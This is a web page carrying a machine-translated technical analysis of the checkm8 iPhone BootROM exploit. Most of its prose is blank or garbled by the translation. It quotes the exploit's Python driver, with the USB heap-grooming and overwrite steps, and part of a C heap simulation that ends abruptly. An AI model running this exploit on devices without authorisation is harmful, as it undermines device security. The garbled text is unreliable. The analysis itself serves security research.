<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🏟️ 🤵🏾 👨🏻‍🚒 checkm8エクスプロイトのテクニカル分析 👩🏻‍🏭 🧚🏻 🚹</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="高い確率で、あなたはすでにセンセーショナルについて聞いたことがcheckm8活用に負えない脆弱性を利用し、BootROM含め、ほとんどのiDevices iPhone X。この記事では、エクスプロイトのテクニカル分析を提供し、脆弱性の原因を調べます。興味のある方-カットへようこそ！
 

こちらの記...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>checkm8エクスプロイトのテクニカル分析</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/471668/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高い確率で、あなたはすでにセンセーショナルについて聞いたことが</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">checkm8</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活用</font><font style="vertical-align: inherit;">に負えない脆弱性を利用し、</font></font><code>BootROM</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">含め、ほとんどのiDevices </font></font><code>iPhone X</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">この記事では、エクスプロイトのテクニカル分析を提供し、脆弱性の原因を調べます。</font><font style="vertical-align: inherit;">興味のある方-カットへようこそ！</font></font></p><a name="habracut"></a><br>
<p><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">こちら</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">の記事の英語版を読むことができ</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;">。</font></font></p><br>
<h2 id="vvedenie"></h2><br>
<p>      iDevice  ,      <code>BootROM</code> (    <code>SecureROM</code>)     .       <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>.       :</p><br>
<p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br>
<p><code>BootROM</code> — ,      .   <code>BootROM</code>:</p><br>
<ul>
<li>  (   ,  <code>CPU</code>  ..)</li>
<li>       <br>
<ul>
<li><code>BootROM</code>   <code>IMG3/IMG4</code> </li>
<li><code>BootROM</code>    <code>GID</code>    </li>
<li>    <code>BootROM</code>    <code>Apple</code>,        </li>
</ul></li>
<li>      (<code>Device Firmware Update</code>, <code>DFU</code>)</li>
</ul><br>
<p> <code>BootROM</code>   ,       <code>iBoot</code>,          . ,    <code>iBoot</code>, <code>BootROM</code>  .     read-only    . <code>BootROM</code> —      .                 .</p><br>
<p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br>
<h2 id="poyavlenie-checkm8"> checkm8</h2><br>
<p> <code>checkm8</code>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ipwndfu</a>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">axi0mX</a> 27  2019.    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>     ,       .    ,  <code>use-after-free</code>    <code>USB</code>      - <code>iBoot</code>  <code>iOS 12 beta</code>  2018 .    ,  <code>BootROM</code>  <code>iBoot</code>   ,      <code>USB</code>, -       <code>BootROM</code>.</p><br>
<p>    ,     <code>DFU</code>.  ,      <code>USB</code>    ,    .   , ,      .</p><br>
<p>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">littlelailo</a> ,              <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">apollo.txt</a>.   ,     <code>checkm8</code>,         .                   <code>BootROM</code> .</p><br>
<p>   ,     ,       2018    <code>iBoot/SecureROM</code>.    ,        — <code>iPhone 7</code> (<code>CPID:8010</code>).   <code>checkm8</code>      <code>SecureROM</code>  <code>SecureRAM</code>,     .</p><br>
<h2 id="neobhodimye-znaniya-o-usb">   USB</h2><br>
<p>     <code>USB</code>,       .     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>,    .  ,       ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">USB in a NutShell</a>.      .</p><br>
<p>      <code>USB</code>.  <code>DFU</code>    <code>Control Transfers</code> (    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>).         :</p><br>
<a name="setup_packet"></a><br>
<ul>
<li><code>Setup Stage</code> —     <code>SETUP</code>-,     :<br>
<ul>
<li><code>bmRequestType</code> —  ,    </li>
<li><code>bRequest</code> — ,    </li>
<li><code>wValue</code>, <code>wIndex</code> —        -</li>
<li><code>wLength</code> —  /   <code>Data Stage</code></li>
</ul></li>
<li><code>Data Stage</code> —  ,     .    <code>SETUP</code>-             (<code>OUT</code>)   (<code>IN</code>).       (  <code>Apple DFU</code> —  0x40 ).<br>
<ul>
<li>      ,   <code>OUT</code>-,     .</li>
<li>      ,   <code>IN</code>-,       .</li>
</ul></li>
<li><code>Status Stage</code> —  ,      .<br>
<ul>
<li> <code>OUT</code>-   <code>IN</code>-,           .</li>
<li> <code>IN</code>-   <code>OUT</code>-     .</li>
</ul></li>
</ul><br>
<p><code>OUT</code> —  <code>IN</code>-    .         <code>ACK</code>, <code>NACK</code>    ,          .</p><br>
<p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br>
<h2 id="analiz-apollotxt"> apollo.txt</h2><br>
<p>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">apollo.txt</a>.      <code>DFU</code>-:</p><br>
<blockquote><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a><br>
<ol>
<li>When usb is started to get an image over dfu, dfu registers an interface to handle all the commands and allocates a buffer for input and output</li>
<li>if you send data to dfu the setup packet is handled by the main code which then calls out to the interface code</li>
<li>the interface code verifies that wLength is shorter than the input output buffer length and if that's the case it updates a pointer passed as an argument with a pointer to the input output buffer</li>
<li>it then returns wLength which is the length it wants to recieve into the buffer</li>
<li>the usb main code then updates a global var with the length and gets ready to recieve the data packages</li>
<li>if a data package is recieved it gets written to the input output buffer via the pointer which was passed as an argument and another global variable is used to keep track of how many bytes were recieved already</li>
<li>if all the data was recieved the dfu specific code is called again and that then goes on to copy the contents of the input output buffer to the memory location from where the image is later booted</li>
<li>after that the usb code resets all variables and goes on to handel new packages</li>
<li>if dfu exits the input output buffer is freed and if parsing of the image fails bootrom reenters dfu</li>
</ol><br>
</blockquote><p>        <code>iBoot</code>.            ,    ,   - <code>SecureROM</code>  <code>iPhone 7</code>  <code>IDA</code>.         <code>iBoot</code>    .</p><br>
<p>   <code>DFU</code>  <code>IO</code>-   <code>USB</code>-     <code>DFU</code>:</p><br>
<p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br>
<p>  <code>SETUP</code>-   <code>DFU</code>    .     <code>OUT</code>- (,   )       <code>IO</code>-     ,   .            .</p><br>
<p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br>
<p>   <code>DFU</code>    .   ,      <code>IO</code>-,     <code>DFU</code>,    ,    <code>SETUP</code>-.</p><br>
<p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br>
<p>  <code>Data Stage</code>      <code>IO</code>-,    <code>IO</code>-      .              .</p><br>
<p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br>
<p>   <code>DFU</code>      ,       .     <code>iBoot</code>,     <code>Apple</code>  <code>INSECURE_MEMORY</code>.</p><br>
<p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br>
<p>    <code>DFU</code>   <code>IO</code>-  .   <code>DFU</code>-    ,     .      <code>DFU</code>-  -      ,    <code>DFU</code>,    .</p><br>
<p>     <code>use-after-free</code> .     <code>SETUP</code>-   ,  <code>Data Stage</code>,          <code>DFU</code>,       <code>IO</code>-,     <code>DFU</code>.</p><br>
<p>   <code>use-after-free</code>,   :       <code>DFU</code>   -?     <code>DFU</code>     ,           . ,          ,    <code>use-after-free</code>,     .</p><br>
<h2 id="analiz-checkm8"> checkm8</h2><br>
<p>     <code>checkm8</code>.        <code>iPhone 7</code>,     ,    ,     <code>USB</code>-    .         ,        <code>checkm8.py</code>. ,        ,    .</p><br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python</span><font></font>
<font></font>
<span class="hljs-keyword">from</span> checkm8 <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    <span class="hljs-keyword">print</span> <span class="hljs-string">'*** checkm8 exploit by axi0mX ***'</span><font></font>
<font></font>
    device = dfu.acquire_device(<span class="hljs-number">1800</span>)<font></font>
    start = time.time()<font></font>
    <span class="hljs-keyword">print</span> <span class="hljs-string">'Found:'</span>, device.serial_number
    <span class="hljs-keyword">if</span> <span class="hljs-string">'PWND:['</span> <span class="hljs-keyword">in</span> device.serial_number:
        <span class="hljs-keyword">print</span> <span class="hljs-string">'Device is already in pwned DFU Mode. Not executing exploit.'</span>
        <span class="hljs-keyword">return</span><font></font>
<font></font>
    payload, _ = exploit_config(device.serial_number)<font></font>
    t8010_nop_gadget = <span class="hljs-number">0x10000CC6C</span>
    callback_chain = <span class="hljs-number">0x1800B0800</span>
    t8010_overwrite = <span class="hljs-string">'\0'</span> * <span class="hljs-number">0x5c0</span>
    t8010_overwrite += struct.pack(<span class="hljs-string">'&lt;32x2Q'</span>, t8010_nop_gadget, callback_chain)<font></font>
<font></font>
    <span class="hljs-comment"># heap feng-shui</span><font></font>
    stall(device)<font></font>
    leak(device)<font></font>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):<font></font>
        no_leak(device)<font></font>
    dfu.usb_reset(device)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    <span class="hljs-comment"># set global state and restart usb</span><font></font>
    device = dfu.acquire_device()<font></font>
    device.serial_number<font></font>
    libusb1_async_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'A'</span> * <span class="hljs-number">0x800</span>, <span class="hljs-number">0.0001</span>)<font></font>
    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    time.sleep(<span class="hljs-number">0.5</span>)<font></font>
<font></font>
    <span class="hljs-comment"># heap occupation</span><font></font>
    device = dfu.acquire_device()<font></font>
    device.serial_number<font></font>
    stall(device)<font></font>
    leak(device)<font></font>
    leak(device)<font></font>
    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, t8010_overwrite, <span class="hljs-number">50</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(payload), <span class="hljs-number">0x800</span>):<font></font>
        libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x21</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<font></font>
                                       payload[i:i+<span class="hljs-number">0x800</span>], <span class="hljs-number">50</span>)<font></font>
    dfu.usb_reset(device)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
    device = dfu.acquire_device()<font></font>
    <span class="hljs-keyword">if</span> <span class="hljs-string">'PWND:[checkm8]'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> device.serial_number:
        <span class="hljs-keyword">print</span> <span class="hljs-string">'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'</span>
        sys.exit(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">print</span> <span class="hljs-string">'Device is now in pwned DFU Mode.'</span>
    <span class="hljs-keyword">print</span> <span class="hljs-string">'(%0.2f seconds)'</span> % (time.time() - start)<font></font>
    dfu.release_device(device)<font></font>
<font></font>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<font></font>
    main()</code></pre><br>
<p> <code>checkm8</code>     :</p><br>
<ol>
<li>  (<code>heap feng-shui</code>)</li>
<li>   <code>IO</code>-    </li>
<li> <code>usb_device_io_request</code>     <code>use-after-free</code></li>
<li>  </li>
<li> <code>callback-chain</code></li>
<li> <code>shellcode</code></li>
</ol><br>
<p>    .</p><br>
<h2 id="1-podgotovka-kuchi-heap-feng-shui">1.   (heap feng-shui)</h2><br>
<p>  ,    ,      .</p><br>
<pre><code class="python hljs">stall(device)<font></font>
leak(device)<font></font>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):<font></font>
    no_leak(device)<font></font>
dfu.usb_reset(device)<font></font>
dfu.release_device(device)</code></pre><br>
<p>          <code>use-after-free</code>.     <code>stall</code>, <code>leak</code>, <code>no_leak</code>:</p><br>
<pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stall</span>(<span class="hljs-params">device</span>):</span>   libusb1_async_ctrl_transfer(device, <span class="hljs-number">0x80</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x304</span>, <span class="hljs-number">0x40A</span>, <span class="hljs-string">'A'</span> * <span class="hljs-number">0xC0</span>, <span class="hljs-number">0.00001</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">device</span>):</span>    libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x80</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x304</span>, <span class="hljs-number">0x40A</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">1</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">no_leak</span>(<span class="hljs-params">device</span>):</span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number">0x80</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x304</span>, <span class="hljs-number">0x40A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">1</span>)</code></pre><br>
<p><code>libusb1_no_error_ctrl_transfer</code> —    <code>device.ctrlTransfer</code>    ,    . <code>libusb1_async_ctrl_transfer</code> —    <code>libusb_submit_transfer</code>  <code>libusb</code>    .</p><br>
<p>    :</p><br>
<ul>
<li> </li>
<li>  <code>SETUP</code>- (  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>):<br>
<ul>
<li><code>bmRequestType</code></li>
<li><code>bRequest</code></li>
<li><code>wValue</code></li>
<li><code>wIndex</code></li>
</ul></li>
<li>  (<code>wLength</code>)     <code>Data Stage</code></li>
<li> </li>
</ul><br>
<p> <code>bmRequestType</code>, <code>bRequest</code>, <code>wValue</code>  <code>wIndex</code>       .  :</p><br>
<ul>
<li><code>bmRequestType = 0x80</code><br>
<ul>
<li><code>0b1XXXXXXX</code> —  <code>Data Stage</code>     (Device to Host)</li>
<li><code>0bX00XXXXX</code> —   </li>
<li><code>0bXXX00000</code> —   — </li>
</ul></li>
<li><code>bRequest = 6</code> —     (<code>GET_DESCRIPTOR</code>)</li>
<li><code>wValue = 0x304</code><br>
<ul>
<li><code>wValueHigh = 0x3</code> —     —  (<code>USB_DT_STRING</code>)</li>
<li><code>wValueLow = 0x4</code> —   , 4     (      <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code>)</li>
</ul></li>
<li><code>wIndex = 0x40A</code> —   ,          .</li>
</ul><br>
<p>         0x30     :</p><br>
<p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br>
<p>      <code>callback</code>  <code>next</code>.</p><br>
<ul>
<li><code>callback</code> —   ,      .</li>
<li><code>next</code> —       ,     .</li>
</ul><br>
<p>   <code>stall</code>        .   ,  ,           ,     .        <code>SETUP</code>- ,  ,     .       <code>USB</code>-  <code>Arduino</code>   ,        <code>SETUP</code>-  <code>IN</code>-,        . ,      :</p><br>
<div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br>
<p>          .   ,       <code>callback</code>,   :</p><br>
<p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br>
<p> <code>io_length</code>    <code>wLength</code>  <code>SETUP</code>-      .   ,    ,      <code>io_length</code>    .  <code>g_setup_request.wLength</code>   <code>wLength</code>  <code>SETUP</code>-,    — <code>0xC1</code>.</p><br>
<p> ,   ,     <code>stall</code>  <code>leak</code>,    <code>callback</code>- ,   <code>usb_core_send_zlp()</code>.       (<code>zero-length-packet</code>)      .        <code>Status Stage</code>.</p><br>
<p>    <code>usb_core_complete_endpoint_io</code>,    <code>callback</code>,     .             ,     <code>USB</code>.       <code>USB</code>,     ,      .</p><br>
<p>    <code>usb_core_send_zlp()</code>                <code>use-after-free</code>.       :</p><br>
<p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br>
<p>   ,     ,       <code>usb_core_complete_endpoint_io</code>.      <code>usb_core_send_zlp</code>    <code>ep-&gt;io_head</code>.     <code>USB</code>       ,     <code>io_head</code>  <code>io_tail</code>,       .          .    ,   :</p><br>
<p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br>
<p>  <code>SecureROM</code>   ,           .       ,        <code>USB</code>    <code>io_buffer</code>  .</p><br>
<p>   ,        <code>DFU</code>.      <code>iBoot</code>  - <code>SecureROM</code>     :</p><br>
<ul>
<li><ol>
<li>   <br>
<ul>
<li>1.1. <code>Nonce</code> ( <code>234</code>)</li>
<li>1.2. <code>Manufacturer</code> (<code>22</code>)</li>
<li>1.3. <code>Product</code> (<code>62</code>)</li>
<li>1.4. <code>Serial Number</code> (<code>198</code>)</li>
<li>1.5. <code>Configuration string</code> (<code>62</code>)</li>
</ul></li>
</ol><br>
</li>
<li><ol>
<li>,     <code>USB</code>-<br>
<ul>
<li>2.1.   (<code>0x3c0</code>)</li>
<li>2.2.   (<code>0x1000</code>)</li>
</ul></li>
</ol><br>
</li>
<li><ol>
<li><code>io_buffer</code> (<code>0x800</code>)</li>
</ol><br>
</li>
<li><ol>
<li> <br>
<ul>
<li>4.1. <code>High-Speed</code> (<code>25</code>)</li>
<li>4.2. <code>Full-Speed</code> (<code>25</code>)</li>
</ul></li>
</ol><br>
</li>
</ul><br>
<p>    .                  ,     ,       <code>usb_device_io_request</code>,    .      :</p><br>
<p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br>
<p>          ,      <code>iBoot</code>.</p><br>
<div class="spoiler"><b class="spoiler_title">     DFU</b><div class="spoiler_text"><pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"heap.h"</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> NOLEAK</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NOLEAK (8)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">void</span> * chunk = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x1004000</span>, <span class="hljs-number">0x100000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk = %p\n"</span>, chunk);<font></font>
    heap_add_chunk(chunk, <span class="hljs-number">0x100000</span>, <span class="hljs-number">1</span>);
    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>); <span class="hljs-comment">//        SecureRAM</span><font></font>
<font></font>
    <span class="hljs-keyword">void</span> * descs[<span class="hljs-number">10</span>];
    <span class="hljs-keyword">void</span> * io_req[<span class="hljs-number">100</span>];<font></font>
    descs[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">234</span>);<font></font>
    descs[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">22</span>);<font></font>
    descs[<span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">62</span>);<font></font>
    descs[<span class="hljs-number">3</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">198</span>);<font></font>
    descs[<span class="hljs-number">4</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">62</span>);<font></font>
<font></font>
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N = NOLEAK;<font></font>
<font></font>
    <span class="hljs-keyword">void</span> * task = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
    <span class="hljs-keyword">void</span> * task_stack = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4000</span>);<font></font>
<font></font>
    <span class="hljs-keyword">void</span> * io_buf_0 = memalign(<span class="hljs-number">0x800</span>, <span class="hljs-number">0x40</span>);
    <span class="hljs-keyword">void</span> * hs = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">25</span>);
    <span class="hljs-keyword">void</span> * fs = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">25</span>);<font></font>
<font></font>
    <span class="hljs-keyword">void</span> * zlps[<span class="hljs-number">2</span>];<font></font>
<font></font>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++)<font></font>
    {<font></font>
        io_req[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++)<font></font>
    {<font></font>
        <span class="hljs-keyword">if</span>(i &lt; <span class="hljs-number">2</span>)<font></font>
        {<font></font>
            zlps[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<font></font>
        }<font></font>
        <span class="hljs-built_in">free</span>(io_req[i]);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<font></font>
    {<font></font>
       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"descs[%d]  = %p\n"</span>, i, descs[i]);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"task = %p\n"</span>, task);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"task_stack = %p\n"</span>, task_stack);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"io_buf = %p\n"</span>, io_buf_0);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hs = %p\n"</span>, hs);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"fs = %p\n"</span>, fs);<font></font>
<font></font>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)<font></font>
    {<font></font>
       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"zlps[%d]  = %p\n"</span>, i, zlps[i]);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"**********\n"</span>);<font></font>
<font></font>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<font></font>
    {<font></font>
        <span class="hljs-built_in">free</span>(descs[i]);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-built_in">free</span>(task);
    <span class="hljs-built_in">free</span>(task_stack);
    <span class="hljs-built_in">free</span>(io_buf_0);
    <span class="hljs-built_in">free</span>(hs);
    <span class="hljs-built_in">free</span>(fs);<font></font>
<font></font>
    descs[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">234</span>);<font></font>
    descs[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">22</span>);<font></font>
    descs[<span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">62</span>);<font></font>
    descs[<span class="hljs-number">3</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">198</span>);<font></font>
    descs[<span class="hljs-number">4</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">62</span>);<font></font>
<font></font>
    task = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<font></font>
    task_stack = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4000</span>);
    <span class="hljs-keyword">void</span> * io_buf_1 = memalign(<span class="hljs-number">0x800</span>, <span class="hljs-number">0x40</span>);<font></font>
    hs = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">25</span>);<font></font>
    fs = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">25</span>);<font></font>
<font></font>
